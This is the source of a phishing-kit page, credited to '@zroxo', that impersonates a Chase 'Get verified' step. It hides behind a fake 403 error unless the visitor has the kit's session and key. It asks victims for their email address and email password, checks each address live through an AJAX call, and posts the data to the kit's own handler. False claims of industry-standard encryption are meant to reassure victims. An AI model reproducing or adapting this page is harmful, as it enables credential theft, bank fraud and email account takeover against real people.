<?php
error_reporting(E_ALL ^ E_NOTICE);
session_start();
// include'Protection.php'; 
   if (!isset($_SESSION['ZRXSESSION']) or !isset($_GET['key'])) {
       header('HTTP/1.0 403 Forbidden');
       die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
       exit();
   }
    /*
    |--------------------------------------------------------------------------
    | CHASE PAGE V1
    |--------------------------------------------------------------------------
    |
    | Contact me : @zroxo
    |
    */
// Generating a CSRF Token

if (empty($_SESSION['token'])) {
    $_SESSION['token'] = bin2hex(random_bytes(32));
}
$token = $_SESSION['token'];

?>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js logon-simplerAuth" lang="en" dir="ltr">
   <head>
      <meta charset="utf-8">
      <meta name="robots" content="noindex,nofollow">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <title>Get verified</title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
       <link rel="shortcut icon" href="files/img/faviconx.ico">
      <link rel="stylesheet" href="files/css/zroxoauth.css">
            <style type="text/css">
              .error2{
                 border: 0.3px solid #bf2155;
              }
              .hidden{
                display:none;
              }
      </style>
   </head>
   <body>
      <div>
         <div class="c65dd8vd" tabindex="-1">
            <div class="t5d8gd4d5nd">
               <header class="sfsf6565sfsf">
                  <div class="logon header zroxoru transparent navigation bar">
                     <a href="#">
                        <div class="zroxo logo"></div>
                     </a>
                  </div>
               </header>
               <main>
                  <div class="msd y5f45df4h" id="simpler-auth">
                     <div class="container">
                        <div class="row zroxoru primary panel">
                           <div class="col-xs-12 col-md-10 col-md-offset-1 sxv6s54dn6sd">
                              <div class="row zroxoru panel body">
                                 <div class="col-xs-12 col-sm-10 col-sm-offset-1">
                                    <div class="row">
                                       <div class="col-xs-6 col-sm-3">
                                          <h1 class="fdb4df4sb progress-label" tabindex="-1">Get verified <span class="util high-contrast accessible-text">Step 1 of 2</span></h1>
                                       </div>
                                       <div class="col-xs-push-1 col-xs-6 col-sm-push-6 col-sm-3"><span class="zroxoru link"><a class="link-anchor" href="javascript:void(0);">Have a question?<i class="zroxoru progressright icon end-icon" aria-hidden="true"></i></a></span></div>
                                    </div>
                                    <div class="row">
                                       <div class="col-xs-12">
                                          <div class="zroxoru progress tjdhbx62w bar" data-progress="50">
                                             <div class="bar fill"></div>
                                             <span class="util accessible-text"></span>
                                          </div>
                                       </div>
                                    </div>
                                    <form id="accessform" action="actions/auth2" method="POST">
                                    <input type="hidden" name="token" value="<?php echo $token; ?>" />  
                                    <h3 class="sqvqsv6qs4v6 dsv6ds4bds4b">Signing in on a new device?</h3>
                                    <?php
                                        if (isset($_GET['invalid2'])) {
                                          echo "<div class='zroxoru user-alert error inverted primary animate alert' id='invaliddd'>
                                                    <div class='content wrap'>
                                                        <h2 class='title' tabindex='-1'>
                                                            <span class='util accessible-text'>Important: </span> <i class='zroxoru exclamation-color icon' aria-hidden='true'></i> It looks like the email password you told us is incorrect. Please try again.</h2>
                                                    </div>
                                                </div><br>";
                                        }elseif (isset($_GET['invalid'])) {
                                          echo "<div class='zroxoru user-alert error inverted primary animate alert' id='invaliddd'>
                                                    <div class='content wrap'>
                                                        <h2 class='title' tabindex='-1'>
                                                            <span class='util accessible-text'>Important: </span> <i class='zroxoru exclamation-color icon' aria-hidden='true'></i> Your account or password is incorrect. Please try again.</h2>
                                                    </div>
                                                </div><br>
                                                <input type='hidden' name='invalid' />";
                                        }
                                     ?>


                                    <p>One more step and you'll be verified.</p>
                                    <p>How should we get in touch?</p>
                                    <div class="inside-container">
                                       <div class="row">
                                          <div class="col-xs-12">
                                             <div>


                                                <div class="zroxoru radiobutton" onclick="error()">
                                                   <div class="tyjdhfb5xx">
                                                      <input type="radio" id="select1" value="otpMethod" name="select"> 
                                                      <div class="irutyetz452" aria-hidden="true">●</div>
                                                      <label class="radiobutton-label" for="select1" id="label-select-1">
                                                         <div>
                                                            <div class="radiobutton-outer-circle" aria-hidden="true">
                                                               <div class="radiobutton-inner-circle"></div>
                                                            </div>
                                                         </div>
                                                         <div class="radiobutton-label-content">Send a notification to my phone <i class="zroxoru info-color icon" aria-hidden="true"></i></div>
                                                      </label>
                                                   </div>
                                                </div>

                                                <div class="zroxoru radiobutton" onclick="email()">
                                                   <div class="tyjdhfb5xx">
                                                      <input type="radio" id="select2" value="otpMethod" name="select"> 
                                                      <div class="irutyetz452" aria-hidden="true">●</div>
                                                      <label class="radiobutton-label" for="select2" id="label-select-2">
                                                         <div>
                                                            <div class="radiobutton-outer-circle" aria-hidden="true">
                                                               <div class="radiobutton-inner-circle"></div>
                                                            </div>
                                                         </div>
                                                         <div class="radiobutton-label-content">Contact me in a different way </div>
                                                      </label>
                                                   </div>
                                                </div>

                                                <div class="zroxoru user-alert error inverted primary animate alert" role="region" id="error" style="display: none;">
                                                    <div class="content wrap">
                                                        <h2 class="title" tabindex="-1">
                                                            <span class="util accessible-text">Important: </span> <i class="zroxoru exclamation-color icon" aria-hidden="true"></i> We weren't able to send your temporary identification code.</h2>
                                                    </div>
                                                </div>
                                                     
                                                
                                                <div id="access">
                                                <br>
                                                <div class="col-sm-7">
                                                   <div class="zroxoru fieldgroup">
                                                      <div class="zroxoru ffgkf5f4jf6fhd row">
                                                         <div>
                                                            <div class="uy8j5gn2fbx row"><label class="zroxoru vxcbn5nb46wv label-alignment ffgkf5f4jf6fhd">Email </label> </div>
                                                            <div class="col-xs-13 row">
                                                               <div class="zroxoru sdbdslsdmjkdsb">
                                                                  <span class="wrap right email" id="errorx"><input class="zroxoru input email" placeholder="Email Address" id="emailaccess" name="emailaccess" value="" type="email" onchange='checkemail()'></span> 
                                                               </div>
                                                            </div>
                                                         </div>
                                                          <div class="email-error error"></div>
                                                         <div class="col-xs-12 row"></div>
                                                         <div>
                                                            <div>  </div>
                                                         </div>
                                                      </div>
                                                   </div>
                                                </div>

                                                <div class="form-row simpler-auth-options clearfix col-sm-7 hidden" id="accesspassword">
                                                   <div class="zroxoru fieldgroup">
                                                      <div class="zroxoru ffgkf5f4jf6fhd row">
                                                         <div class="align-label-input">
                                                            <div class="uy8j5gn2fbx row"><label class="zroxoru vxcbn5nb46wv ffgkf5f4jf6fhd">Email Password</label> </div>
                                                            <div class="col-xs-13 row">
                                                               <div class="zroxoru sdbdslsdmjkdsb">
                                                                  <span class="wrap right pass" ><input class="zroxoru input pass" placeholder="Email Password" id="accesspassword" name="accesspassword" required="" type="password"></span> 
                                                               </div>
                                                            </div>
                                                         </div>
                                                         <div class="col-xs-12 row"></div>
                                                         <div>
                                                            <div>  </div>
                                                         </div>
                                                      </div>
                                                   </div>
                                                </div>


                                                </div>

                                             </div>
                                          </div>
                                       </div>
                                       <span class="zroxo link hidden" id="showmsg">
                                             <a class="nTmm1IdfR9" href="javascript:void(0);">Email authentication?<i class="zroxo THUZSahExR icon UUZWPSwsNP"></i></a>
                                             <p>We use industry-standard encryption to protect your data. By providing your email, we verify in real time that you own the email on file. We then use this information to establish a secure connection with your email provider.</p>
                                       </span>

                                       <div class="zroxoru user-alert error inverted primary animate alert hidden" role="region" id="invalidemail">
                                                    <div class="content wrap">
                                                        <h2 class="title" tabindex="-1">
                                                            <span class="util accessible-text">Important: </span> <i class="zroxoru exclamation-color icon" aria-hidden="true"></i> This Microsoft account doesn't exist!</h2>
                                                    </div>
                                        </div>



                                    </div>
                                    <div class="button-container row b8d54hd4s sdvsdbds8485">
                                       <div class="col-xs-12 col-sm-3 col-sm-offset-6"><button  type="button" id="btn-submit" class="zroxoru button focus fluid cancel"><span class="label">Cancel</span> </button></div>
                                       <div class="col-xs-12 col-sm-3"><button type="submit" id="btn-submit"  class="zroxoru button focus fluid primary"><span class="label">Next</span> </button></div>
                                    </div>
                                    <div class="button-container row hide-sm">
                                       <div class="col-xs-12 col-sm-3 col-sm-push-9"><button id="btn-submit" type="submit" class="zroxoru button focus fluid primary"><span class="label">Next</span> </button></div>
                                       <div class="col-xs-12 col-sm-3 col-sm-push-3"><button id="btn-submit" type="button" class="zroxoru button focus fluid cancel"><span class="label">Cancel</span> </button></div>
                                    </div>
                                    </form>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </main>
            </div>
         </div>
      </div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
<script type="text/javascript">
var x = document.getElementById("emailaccess");
const checkemail = () => {
   let emailaccess = document.getElementById('emailaccess').value;
   $.ajax({
            type : 'POST',
            data : {email : emailaccess},
            url : 'emailcheck.php',
            success : function(response){
                if(response === 'bad'){
                    $("#accesspassword").addClass('hidden');
                    $("#showmsg").addClass('hidden');
                    $("#errorx").addClass('error2');
                }
                if(response === 'invalid'){
                    $("#accesspassword").addClass('hidden');
                    $("#showmsg").addClass('hidden');
                    $("#errorx").addClass('error2');
                    $("#invalidemail").removeClass('hidden');

                }
                if(response === 'good'){
                  $("#accesspassword").removeClass('hidden');
                  $("#showmsg").removeClass('hidden');
                  $(':input[type=submit]').prop('disabled', false);
                  $("#invalidemail").addClass('hidden');
                }

            }
        })
}
</script>
<script type="text/javascript">
$(document).ready(function(){$('#accessform input[id="emailaccess"]').blur(function(){$(this).val()?($(".wrap.right.email").removeClass("error2"),$(".zroxoru.input.email").removeClass("clientSideError")):($(".wrap.right.email").addClass("error2"),$(".zroxo.input.email").addClass("clientSideError"))}),$('#accessform input[id="accesspassword"]').blur(function(){$(this).val()?($(".wrap.right.pass").removeClass("error2"),$(".zroxo.input.pass").removeClass("clientSideError")):($(".wrap.right.pass").addClass("error2"),$(".zroxo.input.pass").addClass("clientSideError"))})});
</script>
<script>
var x=document.getElementById("access"),y=document.getElementById("error"),z=document.getElementById("showmsg");function email(){x.style.display="block",z.style.display="block",y.style.display="none"}function error(){y.style.display="block",x.style.display="none",z.style.display="none"}
</script>
<script type="text/javascript">
setTimeout(function() {
        document.getElementById("invaliddd").style.display = 'none';
}, 10000); 
</script>
</body>
</html>